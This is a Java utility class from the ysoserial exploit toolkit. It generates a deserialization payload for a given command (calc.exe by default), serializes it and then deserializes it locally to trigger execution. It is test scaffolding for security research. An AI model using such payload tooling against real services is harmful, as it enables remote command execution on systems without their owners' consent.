package ysoserial.payloads.util;


import static ysoserial.Deserializer.deserialize;
import static ysoserial.Serializer.serialize;

import java.util.concurrent.Callable;

import ysoserial.payloads.ObjectPayload;
import ysoserial.secmgr.ExecCheckingSecurityManager;


/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings ( {
    "javadoc", "nls"
} )
public class PayloadRunner {

    public static Object run ( final Class<? extends ObjectPayload<?>> clazz, final String[] args ) throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().wrap(new Callable<byte[]>() {

            public byte[] call () throws Exception {
                final String command = args.length > 0 && args[ 0 ] != null ? args[ 0 ] : "calc.exe";

                System.out.println("generating payload object(s) for command: '" + command + "'");

                final Object objBefore = clazz.newInstance().getObject(command);

                System.out.println("serializing payload");

                return serialize(objBefore);
            }
        });

        try {
            System.out.println("deserializing payload");
            return deserialize(serialized);
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }

        return null;
    }

}
